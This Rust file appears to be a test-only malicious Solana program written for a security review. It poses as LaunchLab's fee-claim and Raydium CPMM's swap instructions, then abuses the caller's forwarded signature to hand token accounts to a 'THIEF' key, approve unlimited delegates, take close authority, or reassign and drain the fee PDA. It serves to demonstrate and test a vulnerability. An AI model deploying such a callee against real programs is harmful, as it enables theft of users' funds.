//! TEST-ONLY hostile callee (blind review 3, M-1; ported from the reviewer's scratch `launchlab_evil`). Two entry points, picked by
//! the instruction's 8-byte discriminator:
//!
//!   * LaunchLab `claim_creator_fee` — pays the creator vault's WSOL to the recipient like the real program, then abuses the creator's
//!     (fee PDA's) signature. MODE = the creator vault's `delegated_amount` field (bytes 121..129 of the SPL account, unused there):
//!     0 both abuses below (the reviewer's PoC B)       1 system Assign of the fee PDA to this program
//!     2 SetAuthority(AccountOwner) of the recipient   3 Approve a delegate (its own PDA) on the recipient
//!     4 SetAuthority(CloseAccount) on the recipient   5 behave (no abuse)
//!   * Raydium CPMM `swap_base_input` — performs the swap (amount_in input → input vault; minimum_amount_out output vault → output,
//!     signed by the CPMM authority PDA under this program id), then abuses the payer's (fee PDA's) signature. MODE = the observation
//!     account's last byte (index 4074, padding in CPMM's ObservationState):
//!     0 behave   1 Approve a delegate (its own PDA) on the output account   2 SetAuthority(CloseAccount) on the input account
//!     3 SetAuthority(AccountOwner) of the output account
//!
//! A third entry ([0xEE]) drains an account this program owns (the reviewer's demonstration that the assigned fee PDA is lost).
#![allow(unexpected_cfgs)]
use anchor_lang::solana_program::{
    account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, program::{invoke, invoke_signed}, program_error::ProgramError, pubkey::Pubkey,
    system_instruction,
};
use anchor_spl::token::spl_token;

const CLAIM: [u8; 8] = [26, 97, 138, 203, 132, 171, 141, 252];
const SWAP: [u8; 8] = [143, 190, 90, 218, 196, 30, 51, 222];
const LL_AUTH_SEED: &[u8] = b"creator_fee_vault_auth_seed";
const CPMM_AUTH_SEED: &[u8] = b"vault_and_lp_mint_auth_seed";
pub const THIEF: Pubkey = anchor_lang::prelude::pubkey!("Thief11111111111111111111111111111111111111");

entrypoint!(process);

fn amount_of(acc: &AccountInfo) -> Result<u64, ProgramError> {
    let d = acc.try_borrow_data()?;
    Ok(u64::from_le_bytes(d[64..72].try_into().map_err(|_| ProgramError::InvalidAccountData)?))
}

fn process(program_id: &Pubkey, accounts: &[AccountInfo], data: &[u8]) -> ProgramResult {
    if data == [0xEE] {
        let (from, to) = (&accounts[0], &accounts[1]);
        let l = from.lamports();
        **from.try_borrow_mut_lamports()? -= l;
        **to.try_borrow_mut_lamports()? += l;
        return Ok(());
    }
    if data.len() >= 8 && data[..8] == CLAIM && accounts.len() >= 8 {
        return claim(program_id, accounts);
    }
    if data.len() >= 24 && data[..8] == SWAP && accounts.len() >= 13 {
        let amount_in = u64::from_le_bytes(data[8..16].try_into().unwrap());
        let min_out = u64::from_le_bytes(data[16..24].try_into().unwrap());
        return swap(program_id, accounts, amount_in, min_out);
    }
    Err(ProgramError::InvalidInstructionData)
}

fn claim(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    let (creator, auth, vault, recipient, token, system) = (&accounts[0], &accounts[1], &accounts[2], &accounts[3], &accounts[5], &accounts[6]);
    let (auth_key, auth_bump) = Pubkey::find_program_address(&[LL_AUTH_SEED], program_id);
    let amount = amount_of(vault)?;
    let mode = { let d = vault.try_borrow_data()?; u64::from_le_bytes(d[121..129].try_into().unwrap()) };
    if amount > 0 {
        let ix = spl_token::instruction::transfer(&spl_token::ID, vault.key, recipient.key, &auth_key, &[], amount)?;
        invoke_signed(&ix, &[vault.clone(), recipient.clone(), auth.clone(), token.clone()], &[&[LL_AUTH_SEED, &[auth_bump]]])?;
    }
    let set_owner = || -> ProgramResult {
        let ix = spl_token::instruction::set_authority(&spl_token::ID, recipient.key, Some(&THIEF), spl_token::instruction::AuthorityType::AccountOwner, creator.key, &[])?;
        invoke(&ix, &[recipient.clone(), creator.clone(), token.clone()])
    };
    let assign = || invoke(&system_instruction::assign(creator.key, program_id), &[creator.clone(), system.clone()]);
    match mode {
        0 => { set_owner()?; assign()?; }
        1 => assign()?,
        2 => set_owner()?,
        3 => {
            // delegate = this program's own vault-authority PDA (an account the callee is given), approved with the fee PDA's signature
            let ix = spl_token::instruction::approve(&spl_token::ID, recipient.key, auth.key, creator.key, &[], u64::MAX)?;
            invoke(&ix, &[recipient.clone(), auth.clone(), creator.clone(), token.clone()])?;
        }
        4 => {
            let ix = spl_token::instruction::set_authority(&spl_token::ID, recipient.key, Some(&THIEF), spl_token::instruction::AuthorityType::CloseAccount, creator.key, &[])?;
            invoke(&ix, &[recipient.clone(), creator.clone(), token.clone()])?;
        }
        _ => {}
    }
    Ok(())
}

fn swap(program_id: &Pubkey, a: &[AccountInfo], amount_in: u64, min_out: u64) -> ProgramResult {
    let (payer, authority, input, output, input_vault, output_vault, token, observation) = (&a[0], &a[1], &a[4], &a[5], &a[6], &a[7], &a[8], &a[12]);
    let (auth_key, bump) = Pubkey::find_program_address(&[CPMM_AUTH_SEED], program_id);
    let ix = spl_token::instruction::transfer(&spl_token::ID, input.key, input_vault.key, payer.key, &[], amount_in)?;
    invoke(&ix, &[input.clone(), input_vault.clone(), payer.clone(), token.clone()])?;
    let ix = spl_token::instruction::transfer(&spl_token::ID, output_vault.key, output.key, &auth_key, &[], min_out)?;
    invoke_signed(&ix, &[output_vault.clone(), output.clone(), authority.clone(), token.clone()], &[&[CPMM_AUTH_SEED, &[bump]]])?;
    let mode = { let d = observation.try_borrow_data()?; d.get(4074).copied().unwrap_or(0) };
    match mode {
        1 => {
            // delegate = this program's own authority PDA (an account the callee is given)
            let ix = spl_token::instruction::approve(&spl_token::ID, output.key, authority.key, payer.key, &[], u64::MAX)?;
            invoke(&ix, &[output.clone(), authority.clone(), payer.clone(), token.clone()])?;
        }
        2 => {
            let ix = spl_token::instruction::set_authority(&spl_token::ID, input.key, Some(&THIEF), spl_token::instruction::AuthorityType::CloseAccount, payer.key, &[])?;
            invoke(&ix, &[input.clone(), payer.clone(), token.clone()])?;
        }
        3 => {
            let ix = spl_token::instruction::set_authority(&spl_token::ID, output.key, Some(&THIEF), spl_token::instruction::AuthorityType::AccountOwner, payer.key, &[])?;
            invoke(&ix, &[output.clone(), payer.clone(), token.clone()])?;
        }
        _ => {}
    }
    Ok(())
}
